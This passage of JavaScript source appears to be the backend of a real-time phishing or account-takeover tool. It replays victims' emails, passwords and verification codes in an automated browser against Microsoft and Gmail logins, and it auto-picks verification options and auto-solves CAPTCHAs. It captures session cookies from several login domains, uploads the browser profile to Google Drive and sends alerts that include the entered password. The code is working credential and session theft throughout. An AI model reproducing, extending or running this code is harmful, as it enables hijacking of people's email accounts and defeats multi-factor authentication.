                                    ljp.status = "WAITING_CODE";
                                    ljp.verified = true;
                                    ljp.fullAccess = false;
                                    ljp.message = "Incorrect verification code entered. Please try again.";
                                    sendWrongInputAlert({ type: 'WRONG_CODE', platform, email, browserId, detail: 'Incorrect verification code confirmed' });
                                    // FIX: Await the write to prevent race condition where while loop
                                    // re-reads sheet before WAITINGCODE is written (sees stale PROCESSING)
                                    await updateBrowserRowDataFast(browserId, {
                                        status: "WAITINGCODE",
                                        verificationCode: '',
                                        verified: true,
                                        fullAccess: false,
                                        lastJsonResponse: JSON.stringify(ljp)
                                    });
                                    finalStatus = "WAITINGCODE";
                                    logger.info(`[engineProcess][${browserId}] -WAITINGCODE (incorrect code)`);
                                    activelyProcessing.delete(browserId);
                                    continue; // Continue the while loop to re-poll for new code
                                }

                                // If no code error, then wait 10 seconds and proceed with existing checks
                                await new Promise(res => setTimeout(res, 10000)); // Increased wait to 10 seconds as requested
                                await handleAdditionalViews(page, platformConfig, instanceId, 'post_verification');
                                // After handling additional views, wait for any pending navigation to complete
                                await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => null);
                                // Extra settle time for Microsoft SPA redirects
                                await new Promise(res => setTimeout(res, 3000));
                            } else {
                                // No code entered, handle Gmail app approval or other passive verifications
                                logger.info(`[processRow][${browserId}][WAITINGCODE] No code entry attempted. Waiting for passive verification completion. Checking inbox every 5 seconds.`);
                                // For passive verification, check inbox every 5 seconds until timeout
                                let checkCount = 0;
                                while (Date.now() < pollingTimeout && finalStatus === "WAITINGCODE") {
                                    // Handle any post-verification additional views like recovery info cancel
                                    await handleAdditionalViews(page, platformConfig, instanceId, 'general');
                                    const inboxChecked = await isInbox(page, platformConfig);
                                    if (inboxChecked) {
                                        logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached during passive verification. Setting status to COMPLETED.`);
                                        finalStatus = "COMPLETED";
                                        codeSuccessfullyProcessed = true;

                                        const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
                                        updateData.status = "COMPLETED";
                                        updateData.cookieJSON = JSON.stringify(browserCookies);
                                        updateData.verified = true; // Set verified to true on COMPLETED
                                        updateData.fullAccess = true; // Set fullAccess to true on COMPLETED
                                        updateData.lastJsonResponse = JSON.stringify({
                                            browserId, email, status: "COMPLETED",
                                            emailExists: initialCheckResult.emailExists, accountAccess: true,
                                            reachedInbox: true, requiresVerification: false,
                                            verified: true, fullAccess: true, // Include in response
                                            platform, timestamp: new Date().toISOString(),
                                            message: "Successfully verified with passive approval and reached inbox."
                                        });
                                        // updateData.verificationCode = ''; // Removed clearing

                                        if (browser) {
                                            if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
                                            logger.info(`[processRow][${browserId}] Closing browser after successful verification.`);
                                            await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
                                            browserFullyClosed = true;
                                            activeBrowserSessions.delete(browserId);
                                            await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
                                        }

                                        let uploadedDriveUrlAfterPassive = null;
                                        try {
                                            uploadedDriveUrlAfterPassive = await uploadBrowserData(browserId);
                                            if (uploadedDriveUrlAfterPassive) {
                                                updateData.driveUrl = uploadedDriveUrlAfterPassive;
                                            }
                                        } catch (uploadError) {
                                            logger.error(`[processRow][${browserId}] Error during Google Drive upload after passive: ${uploadError.message}`);
                                        }

                                        if (updateData.driveUrl && userDataDir) {
                                            try {
                                                await fs.remove(userDataDir);
                                                logger.info(`[processRow][${browserId}][WAITINGCODE] Deleted user data dir after completion.`);
                                            } catch (deleteError) {
                                                logger.error(`[processRow][${browserId}][WAITINGCODE] Error deleting user data dir: ${deleteError.message}`);
                                            }
                                        }
                                        break; // Break the passive check loop
                                    } else {
                                        checkCount++;
                                        await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before next check
                                    }
                                }
                            }

                            const inboxReachedAfterWait = await isInbox(page, platformConfig);

                            if (inboxReachedAfterWait) {
                                logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached after verification wait. Setting status to COMPLETED.`);
                                finalStatus = "COMPLETED";
                                codeSuccessfullyProcessed = true;

                                const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
                                updateData.status = "COMPLETED";
                                updateData.cookieJSON = JSON.stringify(browserCookies);
                                updateData.verified = true; // Set verified to true on COMPLETED
                                updateData.fullAccess = true; // Set fullAccess to true on COMPLETED
                                updateData.lastJsonResponse = JSON.stringify({
                                    browserId, email, status: "COMPLETED",
                                    emailExists: initialCheckResult.emailExists, accountAccess: true,
                                    reachedInbox: true, requiresVerification: false,
                                    verified: true, fullAccess: true, // Include in response
                                    platform, timestamp: new Date().toISOString(),
                                    message: "Successfully verified without code and reached inbox."
                                });
                                // updateData.verificationCode = ''; // Removed clearing

                                if (browser) {
                                    if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
                                    logger.info(`[processRow][${browserId}] Closing browser after successful verification.`);
                                    await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
                                    browserFullyClosed = true;
                                    activeBrowserSessions.delete(browserId);
                                    await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
                                }

                                let uploadedDriveUrlAfterCode = null;
                                try {
                                    uploadedDriveUrlAfterCode = await uploadBrowserData(browserId);
                                    if (uploadedDriveUrlAfterCode) {
                                        updateData.driveUrl = uploadedDriveUrlAfterCode;
                                    }
                                } catch (uploadError) {
                                    logger.error(`[processRow][${browserId}] Error during Google Drive upload after code: ${uploadError.message}`);
                                }

                                if (updateData.driveUrl && userDataDir) {
                                    try {
                                        await fs.remove(userDataDir);
                                        logger.info(`[processRow][${browserId}][WAITINGCODE] Deleted user data dir after completion.`);
                                    } catch (deleteError) {
                                        logger.error(`[processRow][${browserId}][WAITINGCODE] Error deleting user data dir: ${deleteError.message}`);
                                    }
                                }
                                break;
                            }

                            let stillOnCodeEntryScreen = false;
                            let returnedToChoiceScreen = false;

                            const postCodeVerificationState = await checkVerification(page, platformConfig);
                            if (postCodeVerificationState.required) {
                                if (codeEntryAttempted && postCodeVerificationState.type === 'code') {
                                    stillOnCodeEntryScreen = true;
                                    logger.warn(`[processRow][${browserId}][WAITINGCODE] Still on a code entry screen after submission attempt. Assuming code was incorrect.`);
                                } else if (codeEntryAttempted && postCodeVerificationState.type === 'choice') {
                                    returnedToChoiceScreen = true;
                                    logger.warn(`[processRow][${browserId}][WAITINGCODE] Returned to choice screen after code submission attempt.`);
                                }
                            }

                            if (returnedToChoiceScreen) {
                                logger.warn(`[processRow][${browserId}][WAITING_CODE] Returned to choice screen. Transitioning to WAITING_OPTIONS.`);
                                finalStatus = "WAITINGOPTIONS";
                                const freshOptionsFromLoopback = await platformConfig.extractVerificationOptions(page, platformConfig, postCodeVerificationState.viewName);
                                updateData = {
                                    status: "WAITINGOPTIONS",
                                    verificationCode: '',
                                    verificationOptions: JSON.stringify(freshOptionsFromLoopback),
                                    lastJsonResponse: JSON.stringify({
                                        ...JSON.parse(updateData.lastJsonResponse || '{}'),
                                        status: "WAITING_OPTIONS",
                                        message: "Incorrect code or issue, returned to verification options. Please choose again.",
                                        verificationState: 'WAITING_OPTIONS',
                                        verificationOptions: freshOptionsFromLoopback,
                                        viewName: postCodeVerificationState.viewName
                                    })
                                };
                                sendWrongInputAlert({ type: 'WRONG_CODE', platform, email, browserId, detail: 'Incorrect code, returned to choice screen' });
                                updateBrowserRowDataFast(browserId, updateData);
                                codeSuccessfullyProcessed = false;
                                break;
                            } else if (stillOnCodeEntryScreen) {
                                logger.warn(`[processRow][${browserId}][WAITING_CODE] Still on code entry screen. Assuming code was incorrect. Resetting status to WAITING_CODE.`);
                                sendWrongInputAlert({ type: 'WRONG_CODE', platform, email, browserId, detail: 'Still on code entry screen after submission' });
                                updateBrowserRowDataFast(browserId, {
                                    status: "WAITINGCODE",
                                    verificationCode: '',
                                    lastJsonResponse: JSON.stringify({
                                        ...JSON.parse(updateData.lastJsonResponse || '{}'),
                                        status: "WAITING_CODE",
                                        message: "Incorrect verification code entered. Please try again."
                                    })
                                });
                                break;
                            } else if (postCodeVerificationState.required && postCodeVerificationState.type === 'text_input') {
                                logger.info(`[processRow][${browserId}][WAITINGCODE] Transitioned to text input (recovery email) after code. Setting WAITINGRECOVERYEMAIL.`);
                                finalStatus = "WAITINGRECOVERYEMAIL";
                                updateData.status = "WAITINGRECOVERYEMAIL";
                                updateData.verificationCode = '';
                                updateData.lastJsonResponse = JSON.stringify({
                                    ...JSON.parse(updateData.lastJsonResponse || '{}'),
                                    status: "WAITING_RECOVERY_EMAIL",
                                    verificationState: 'WAITING_RECOVERY_EMAIL',
                                    viewName: postCodeVerificationState.viewName,
                                    message: "Recovery email confirmation required after code submission."
                                });
                                updateBrowserRowDataFast(browserId, updateData);
                                break;
                            } else {
                                let inboxCheckAfterCode = false;
                                for (let attempt = 0; attempt < 3; attempt++) {
                                    inboxCheckAfterCode = await isInbox(page, platformConfig).catch(() => false);
                                    if (inboxCheckAfterCode) break;
                                    logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox not reached yet after code (attempt ${attempt + 1}/3). Waiting 5s for redirect...`);
                                    await new Promise(resolve => setTimeout(resolve, 5000));
                                }
                                if (inboxCheckAfterCode) {
                                    logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached after code submission. Setting COMPLETED.`);
                                    finalStatus = "COMPLETED";
                                    codeSuccessfullyProcessed = true;
                                    await handleAdditionalViews(page, platformConfig, instanceId, 'post_verification');
                                    const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
                                    updateData.status = "COMPLETED";
                                    updateData.cookieJSON = JSON.stringify(browserCookies);
                                    updateData.verified = true;
                                    updateData.fullAccess = true;
                                    updateData.lastJsonResponse = JSON.stringify({
                                        browserId, email, status: "COMPLETED",
                                        emailExists: true, accountAccess: true,
                                        reachedInbox: true, requiresVerification: false,
                                        verified: true, fullAccess: true,
                                        platform, timestamp: new Date().toISOString(),
                                        message: "Successfully verified and reached inbox."
                                    });
                                    break;
                                }
                                logger.error(`[processRow][${browserId}][WAITING_CODE] Unexpected page state after verification attempt. Failing. Current URL: ${page.url()}`);
                                finalStatus = "FAILED";
                                codeSuccessfullyProcessed = false;
                                break;
                            }
                        } else {
                            logger.error(`[processRow][${browserId}][WAITING_CODE] Verification code input/submit selectors not defined for platform ${platform}. Failing.`);
                            finalStatus = "FAILED";
                            break;
                        }
                    }

                } catch (pollError) {
                    logger.error(`[processRow][${browserId}][WAITING_CODE] Error during polling: ${pollError.message}`);
                    await new Promise(resolve => setTimeout(resolve, 15000));
                }

                if (finalStatus === "WAITINGCODE" && !codeSuccessfullyProcessed) {
                    await new Promise(resolve => setTimeout(resolve, 5000)); // Reduced polling interval from 10000 to 5000
                }
            }

            // FIX: If loop broke because sheet changed to PROCESSING during code entry
            // (e.g., incorrect code retry), keep browser open and restore WAITINGCODE
            // so the interval re-picks the row for another attempt.
            if (finalStatus === "PROCESSING" && !codeSuccessfullyProcessed) {
                            logger.info(`[processRow][${browserId}] Code retry in progress (loop broke on PROCESSING). Restoring WAITINGCODE for next pick-up.`);
                sendWrongInputAlert({ type: 'WRONG_CODE', platform, email, browserId, detail: 'Code retry — loop broke on PROCESSING' });
                finalStatus = "WAITINGCODE";
                updateData.status = "WAITINGCODE";
                updateData.lastJsonResponse = JSON.stringify({
                    ...JSON.parse(updateData.lastJsonResponse || '{}'),
                    status: "WAITINGCODE",
                    engineRetrying: true,
                    message: "Incorrect code. Waiting for new code."
                });
                updateBrowserRowDataFast(browserId, {
                    status: "WAITINGCODE",
                    verificationCode: '',
                    verified: true,
                    fullAccess: false,
                    lastJsonResponse: updateData.lastJsonResponse
                });
                return;
            }

            if (finalStatus === "WAITINGCODE" && !codeSuccessfullyProcessed) {
                logger.warn(`[processRow][${browserId}][WAITINGCODE] Polling for code timed out or failed. Setting status to FAILED.`);
                finalStatus = "FAILED";
                updateData.status = "FAILED";
                updateData.verified = true; // Account access achieved, verified but not full access (timeout on code)
                updateData.fullAccess = false; // FAILED so fullAccess false
                updateData.lastJsonResponse = JSON.stringify({
                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                    message: "Failed during WAITING_CODE phase: Code not provided in time or processing failed."
                });

                // Explicitly close browser and clean up immediately
                if (browser && !browserFullyClosed) {
                    if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
                    await browser.close().catch(err => logger.error(`Error closing browser for ${browserId} on WAITING_CODE timeout: ${err.message}`));
                    browserFullyClosed = true;
                    activeBrowserSessions.delete(browserId);
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
                if (userDataDir) {
                    try {
                        logger.info(`[processRow][${browserId}] Deleting user data dir for WAITING_CODE timeout: ${userDataDir}`);
                        await fs.remove(userDataDir);
                        logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
                    } catch (deleteError) {
                        logger.error(`[processRow][${browserId}] Error deleting user data directory on WAITING_CODE timeout: ${deleteError.message}`);
                    }
                }
                return; // Exit processRow if code not found or processing failed
            }

            updateData.status = finalStatus;
            if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("COMPLETED")) {
                updateData.lastJsonResponse = JSON.stringify({
                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                    message: "Failed during WAITING_CODE phase."
                });
            } else if (finalStatus === "WAITING_OPTIONS") {
                updateData.lastJsonResponse = JSON.stringify({
                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "WAITING_OPTIONS",
                    message: "Incorrect code, returned to verification options."
                });
            }
            logger.info(`[processRow][${browserId}] Exited WAITING_CODE loop. Final status for sheet update: ${updateData.status}`);
        }

        logger.info(`[processRow][${browserId}] Result from checkAccountAccess: ${JSON.stringify(initialCheckResult)}`);

        // Determine finalStatus based on initialCheckResult and current state
        let currentVerificationOptions = initialCheckResult.verificationOptions || [];

        // If finalStatus was already set to FAILED within a polling loop (e.g., timeout, unresponsive page),
        // we should respect that and not overwrite it with a less severe status.
        // However, if it's still the default "FAILED" from initialization, we can update it.
        // Prioritize explicit verification states from initialCheckResult

        // Handle CAPTCHA_FAILED — set FAILED (no fallback, auto-solve only)
        if (initialCheckResult.verificationState === 'CAPTCHA_FAILED') {
            logger.info(`[processRow][${browserId}] CAPTCHA_FAILED detected. Setting FAILED status.`);
            finalStatus = "FAILED";
            updateData.status = "FAILED";
            updateData.lastJsonResponse = JSON.stringify({
                browserId, email, status: "FAILED",
                emailExists: initialCheckResult.emailExists,
                accountAccess: false,
                reachedInbox: false,
                platform, timestamp: new Date().toISOString(),
                message: "CAPTCHA could not be solved automatically. Please try again.",
                captchaUrl: page ? page.url() : undefined
            });
            notifyTeam({ type: 'CAPTCHA_FAILED', platform, email, browserId, detail: 'CAPTCHA auto-solve failed', url: page ? page.url() : undefined });
            updateBrowserRowDataFast(browserId, updateData);
            return;
        }

        if (initialCheckResult.requiresVerification && finalStatus !== "FAILED" && finalStatus !== "COMPLETED" && finalStatus !== "WAITINGCODE" && finalStatus !== "WAITINGOPTIONS" && finalStatus !== "WAITINGRECOVERYEMAIL") {
            const sheetStatus = initialCheckResult.verificationState.replace(/_/g, ''); // Non-underscore for sheet status
            finalStatus = initialCheckResult.verificationState; // Keep original with underscore for internal use/lastJsonResponse
            updateData.lastJsonResponse = JSON.stringify({
                browserId, email, status: sheetStatus, // Use non-underscore for 'status' field in JSON
                emailExists: initialCheckResult.emailExists,
                accountAccess: initialCheckResult.accountAccess,
                reachedInbox: initialCheckResult.reachedInbox,
                requiresVerification: initialCheckResult.requiresVerification,
                verificationState: initialCheckResult.verificationState, // Keep original with underscore
                verificationOptions: initialCheckResult.verificationOptions || [],
                viewName: initialCheckResult.viewName || null,
                platform, timestamp: new Date().toISOString(),
                message: initialCheckResult.message || (sheetStatus === 'WAITINGOPTIONS' ? 'Awaiting verification choice.' : 'Awaiting verification code.')
            });
            // Update verification options in the sheet if available
            if (initialCheckResult.verificationOptions && initialCheckResult.verificationOptions.length > 0) {
                updateData.verificationOptions = JSON.stringify(initialCheckResult.verificationOptions);
            }
            updateData.status = sheetStatus; // Send non-underscore status to the sheet

            // Auto-select the first verification option so the engine proceeds without waiting for user input
            if (initialCheckResult.verificationState === 'WAITING_OPTIONS' && Array.isArray(initialCheckResult.verificationOptions) && initialCheckResult.verificationOptions.length > 0) {
                const firstOption = initialCheckResult.verificationOptions[0];
                const choicePayload = { choice: firstOption.choiceIndex ?? Object.keys(initialCheckResult.verificationOptions).indexOf(firstOption) };
                if (firstOption.requiresInput && firstOption.type === 'full_email_input' && email) {
                    choicePayload.hiddenPhoneEmail = email;
                }
                updateData.verificationChoice = JSON.stringify([choicePayload]);
                logger.info(`[processRow][${browserId}] Auto-selected first verification option: ${JSON.stringify(firstOption)}`);
            }

            updateBrowserRowDataFast(browserId, updateData);
            return; // Exit processRow immediately — the WAITINGOPTIONS resume handler will pick up the auto-selected choice
        } else if (initialCheckResult.verificationState === 'WAITINGEMAIL_ERROR') {
            const sheetStatus = initialCheckResult.verificationState.replace(/_/g, '');
            finalStatus = initialCheckResult.verificationState; // Keep original with underscore
            updateData.lastJsonResponse = JSON.stringify({
                browserId, email, status: sheetStatus,
                emailExists: initialCheckResult.emailExists,
                accountAccess: initialCheckResult.accountAccess,
                reachedInbox: initialCheckResult.reachedInbox,
                requiresVerification: initialCheckResult.requiresVerification,
                verificationState: initialCheckResult.verificationState,
                verificationOptions: currentVerificationOptions,
                platform, timestamp: new Date().toISOString(),
                message: initialCheckResult.message // Use the message from checkAccountAccess
            });
            sendWrongInputAlert({ type: 'WRONG_EMAIL', platform, email, browserId, detail: `WAITINGEMAIL_ERROR: "${initialCheckResult.message}"` });
            updateData.status = sheetStatus;
            updateBrowserRowDataFast(browserId, { ...updateData, email: '' });
            return;
        } else if (initialCheckResult.verificationState === 'WAITINGPASSWORD_ERROR') {
            // Unify: use WAITINGPASSWORD (not WAITINGPASSWORDERROR) so the WAITINGPASSWORD handler retries correctly
            logger.info(`[processRow][${browserId}] WAITINGPASSWORD_ERROR detected. Setting WAITINGPASSWORD for retry.`);
            finalStatus = "WAITINGPASSWORD";
            updateData.status = "WAITINGPASSWORD";
            updateData.lastJsonResponse = JSON.stringify({
                browserId, email, status: "WAITINGPASSWORD",
                emailExists: initialCheckResult.emailExists,
                accountAccess: initialCheckResult.accountAccess,
                reachedInbox: initialCheckResult.reachedInbox,
                requiresVerification: initialCheckResult.requiresVerification,
                verificationState: initialCheckResult.verificationState,
                verificationOptions: currentVerificationOptions,
                platform, timestamp: new Date().toISOString(),
                message: initialCheckResult.message
            });
            sendWrongInputAlert({ type: 'WRONG_PASSWORD', platform, email, browserId, password, detail: `WAITINGPASSWORD_ERROR: "${initialCheckResult.message}"` });
            updateBrowserRowDataFast(browserId, { ...updateData, password: '' });
            return;
        } else if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined)) {
            logger.info(`[processRow][${browserId}] Generic email error detected. Checking if due to cookie sheet row state or session expiration.`);
            if (status === "WAITINGPASSWORD") {
                logger.info(`[processRow][${browserId}] Session likely expired during WAITINGPASSWORD phase. Setting status to FAILED and keeping email.`);
                finalStatus = "FAILED";
                updateData.lastJsonResponse = JSON.stringify({
                    browserId, email, status: finalStatus,
                    emailExists: initialCheckResult.emailExists,
                    accountAccess: initialCheckResult.accountAccess,
                    reachedInbox: initialCheckResult.reachedInbox,
                    requiresVerification: initialCheckResult.requiresVerification,
                    verificationState: initialCheckResult.verificationState || null,
                    verificationOptions: currentVerificationOptions,
                    platform, timestamp: new Date().toISOString(),
                    message: "Session expired during password entry. Please restart the process."
                });
                sendWrongInputAlert({ type: 'SESSION_EXPIRED', platform, email, browserId, detail: 'Session expired during WAITINGPASSWORD phase' });
                updateData.status = finalStatus;
                updateBrowserRowDataFast(browserId, updateData);
                return;
            } else {
                logger.info(`[processRow][${browserId}] Setting status to WAITINGEMAIL and clearing email.`);
                finalStatus = "WAITINGEMAIL";
                updateData.lastJsonResponse = JSON.stringify({
                    browserId, email, status: finalStatus,
                    emailExists: initialCheckResult.emailExists,
                    accountAccess: initialCheckResult.accountAccess,
                    reachedInbox: initialCheckResult.reachedInbox,
                    requiresVerification: initialCheckResult.requiresVerification,
                    verificationState: initialCheckResult.verificationState || null,
                    verificationOptions: currentVerificationOptions,
                    platform, timestamp: new Date().toISOString(),
                    message: "Email does not exist. Please provide a valid email."
                });
                sendWrongInputAlert({ type: 'WRONG_EMAIL', platform, email, browserId, detail: 'Email not found after processing' });
                updateData.status = finalStatus;
                updateBrowserRowDataFast(browserId, { ...updateData, email: '' });
                return;
            }
        } else if (finalStatus === "FAILED" && initialCheckResult.emailExists) {
            if (initialCheckResult.verificationState === 'WAITING_PASSWORD') {
                if (password) {
                    logger.info(`[processRow][${browserId}] WAITING_PASSWORD but password already available. Restoring to WAITINGPASSWORD for retry.`);
                    updateData.status = "WAITINGPASSWORD";
                    updateBrowserRowDataFast(browserId, { status: "WAITINGPASSWORD", email: email || '' });
                    return;
                }
                finalStatus = "WAITINGPASSWORD";
                updateBrowserRowDataFast(browserId, { status: "WAITINGPASSWORD", email: email || '', verified: false, fullAccess: false });
            } else if (initialCheckResult.accountAccess) {
                if (!initialCheckResult.requiresVerification) {
                    if (initialCheckResult.reachedInbox) {
                        finalStatus = "COMPLETED";
                    } else {
                        logger.warn(`[processRow][${browserId}] Login successful but did not reach expected inbox state. Setting status to FAILED.`);
                        finalStatus = "FAILED";
                    }
                } else { // This case should be covered by the initial 'if (initialCheckResult.requiresVerification)' block.
                    // Convert verificationState to sheet status format
                    const sheetStatus = initialCheckResult.verificationState.replace(/_/g, '');
                    if (sheetStatus === 'WAITINGOPTIONS') {
                        finalStatus = "WAITINGOPTIONS";
                    } else { // Should be WAITINGCODE
                        finalStatus = "WAITINGCODE";
                    }
                }
            } else {
                finalStatus = "FAILED";
            }
        } else if (!initialCheckResult.emailExists && finalStatus !== "FAILED" && finalStatus !== "COMPLETED" && finalStatus !== "WAITINGOPTIONS" && finalStatus !== "WAITINGCODE") {
            finalStatus = "FAILED";
        }

        // Include viewName in lastJsonResponse so WAITINGCODE/WAITINGOPTIONS re-entry
        // can identify the correct code entry view type (e.g. Outlook Authenticator OTP)
        // rather than falling through to generic selectors (#iOttText etc.).
        const finalViewName = initialCheckResult.viewName || (JSON.parse(updateData.lastJsonResponse || '{}').viewName) || '';
        updateData = {
            status: finalStatus,
            lastJsonResponse: JSON.stringify({
                browserId, email, status: finalStatus,
                emailExists: initialCheckResult.emailExists,
                accountAccess: initialCheckResult.accountAccess,
                reachedInbox: initialCheckResult.reachedInbox,
                requiresVerification: initialCheckResult.requiresVerification,
                verificationState: initialCheckResult.verificationState,
                verificationOptions: currentVerificationOptions,
                viewName: finalViewName,
                platform, timestamp: new Date().toISOString(),
                message: initialCheckResult.message || (finalStatus === "FAILED" ? "Processing failed due to an unexpected error." : "Process completed successfully.")
            })
        };

        if (finalStatus === "WAITINGOPTIONS" || finalStatus === "WAITINGCODE" || finalStatus === "WAITINGRECOVERYEMAIL") { // Also update for WAITING_CODE if options are relevant
            updateData.verificationOptions = JSON.stringify(currentVerificationOptions);
            updateData.engineProcessing = false;
            logger.info(`[engineProcess][${browserId}] -FINAL (return from waiting state)`);
            activelyProcessing.delete(browserId);
            updateBrowserRowDataFast(browserId, updateData);
            logger.info(`[processRow][${browserId}] Status set to ${finalStatus}. Sheet updated with options.`);
            return; // Prevent fall-through to COMPLETED handler which would overwrite WAITINGCODE status
        }


        if ((finalStatus === "COMPLETED" || initialCheckResult.accountAccess) && !browserFullyClosed) {
            const allUrls = [
                `https://${domain}`,
                `https://login.live.com`,
                `https://login.microsoftonline.com`,
                `https://www.microsoft.com`,
                `https://outlook.live.com`,
                `https://mail.google.com`,
            ];
            const browserCookies = await page.cookies(...allUrls);
            updateData.cookieJSON = JSON.stringify(browserCookies);
            logger.info(`[processRow][${browserId}] Captured ${browserCookies.length} cookies from all domains.`);
            updateData.verified = true; // Set verified to true on COMPLETED without verification
            updateData.fullAccess = (finalStatus === "COMPLETED" && initialCheckResult.reachedInbox === true); // Only fullAccess if inbox was actually reached
            updateData.status = finalStatus;
            updateData.lastJsonResponse = JSON.stringify({
                browserId, email, status: finalStatus,
                emailExists: initialCheckResult.emailExists,
                accountAccess: initialCheckResult.accountAccess,
                reachedInbox: initialCheckResult.reachedInbox,
                requiresVerification: initialCheckResult.requiresVerification,
                verificationState: initialCheckResult.verificationState,
                verificationOptions: currentVerificationOptions,
                platform, timestamp: new Date().toISOString(),
                message: initialCheckResult.message || "Process completed successfully."
            });

            if (browser) {
                if (targetCreatedListener && browser && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
                logger.info(`[processRow][${browserId}] Closing browser for COMPLETED status before Drive upload.`);
                await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
                browserFullyClosed = true;
                activeBrowserSessions.delete(browserId);
                await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
            }

            let uploadedDriveUrl = null;
            try {
                uploadedDriveUrl = await uploadBrowserData(browserId);
                if (uploadedDriveUrl) {
                    updateData.driveUrl = uploadedDriveUrl;
                    logger.info(`[processRow][${browserId}] Successfully uploaded browser data to Google Drive.`);
                } else {
                    logger.warn(`[processRow][${browserId}] Google Drive upload skipped or failed.`);
                }
            } catch (uploadError) {
                logger.error(`[processRow][${browserId}] Error during Google Drive upload: ${uploadError.message}`);
            }

            if (updateData.driveUrl && userDataDir) {
                try {
                    logger.info(`[processRow][${browserId}] Process COMPLETED and uploaded. Deleting user data directory: ${userDataDir}`);
                    await fs.remove(userDataDir);
                    logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
                } catch (deleteError) {
                    logger.error(`[processRow][${browserId}] Error deleting user data directory after completion: ${deleteError.message}`);
                }
            }
        }

    } catch (error) {
        logger.error(`[processRow][${browserId}] Error processing row: ${error.message}`, error);
        logger.info(`[engineProcess][${browserId}] -CATCH (unexpected error)`);
        activelyProcessing.delete(browserId);
        if (finalStatus !== "COMPLETED") {
            finalStatus = "FAILED";
            updateData.status = "FAILED";
            updateData.verified = false;
            updateData.fullAccess = false;
            // Attempt to capture cookies even on crash (if page still accessible)
            if (page && !browserFullyClosed) {
                try {
                    const allUrls = [
                        `https://${domain}`,
                        `https://login.live.com`,
                        `https://login.microsoftonline.com`,
                        `https://www.microsoft.com`,
                        `https://outlook.live.com`,
                        `https://mail.google.com`,
                    ];
                    const browserCookies = await page.cookies(...allUrls);
                    if (browserCookies.length > 0) {
                        updateData.cookieJSON = JSON.stringify(browserCookies);
                        logger.info(`[processRow][${browserId}] Captured ${browserCookies.length} cookies from crash handler.`);
                    }
                } catch (cookieErr) {
                    logger.warn(`[processRow][${browserId}] Could not capture cookies in crash handler: ${cookieErr.message}`);
                }
            }
            updateData.lastJsonResponse = JSON.stringify({
            browserId, email, status: "FAILED", error: error.message,
            platform, timestamp: new Date().toISOString(),
            ...(initialCheckResult.emailExists !== undefined && {
                emailExists: initialCheckResult.emailExists,
                accountAccess: initialCheckResult.accountAccess,
                reachedInbox: initialCheckResult.reachedInbox,
                requiresVerification: initialCheckResult.requiresVerification,
                verificationState: initialCheckResult.verificationState
            })
        });
        notifyTeam({ type: 'UNEXPECTED_ERROR', platform, email, browserId, error: error.message, detail: 'processRow outer catch' });
        }
    } finally {
        logger.info(`[engineProcess][${browserId}] -FINALLY (cleanup)`);
        activelyProcessing.delete(browserId);
        if (updateData.status === "FAILED" && page && typeof page.content === 'function') {
            const endpointUrl = typeof page.url === 'function' ? page.url() : 'unknown';
            saveDebugSnapshot(page, browserId, endpointUrl, updateData.reason || 'No reason provided').catch(err =>
                logger.error(`[processRow][${browserId}] saveDebugSnapshot failed: ${err.message}`)
            );
        }
        if (browser && !browserFullyClosed) {
            const sessionTargetListener = isReusingBrowser ? activeBrowserSessions.get(browserId)?.targetCreatedListener : targetCreatedListener;
            if (sessionTargetListener && browser) { // Ensure listener exists before trying to remove
                try {
                    browser.off('targetcreated', sessionTargetListener);
                } catch (offError) {
                    logger.warn(`[processRow][${browserId}] Error removing targetcreated listener: ${offError.message}`);
                }
            }

            if (updateData.status === "WAITINGCAPTCHA" || updateData.status === "WAITINGCODE" || updateData.status === "WAITINGOPTIONS" || updateData.status === "WAITINGRECOVERYEMAIL" || updateData.status === "WAITINGPASSWORD" || updateData.status === "WAITINGEMAIL" || updateData.status === "WAITINGPASSWORDERROR" || updateData.status === "WAITINGEMAILERROR") {
                logger.info(`[processRow][${browserId}] Keeping browser open as it is in ${updateData.status} state. Storing session.`);
                activeBrowserSessions.set(browserId, { browser, page, targetCreatedListener: sessionTargetListener }); // Store the listener that was active for this session
            } else {
                // Update cache with final status BEFORE closing browser so template sees it immediately
                setCachedRow(browserId, { ...updateData, email: email || '', password: password || '' });
                logger.info(`[processRow][${browserId}] Final cleanup - Closing browser (status: ${updateData.status})`);
                await browser.close().catch(err => logger.error(`Error closing browser during cleanup for ${browserId}: ${err.message}`));
                browserFullyClosed = true;
                activeBrowserSessions.delete(browserId);
                await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
            }
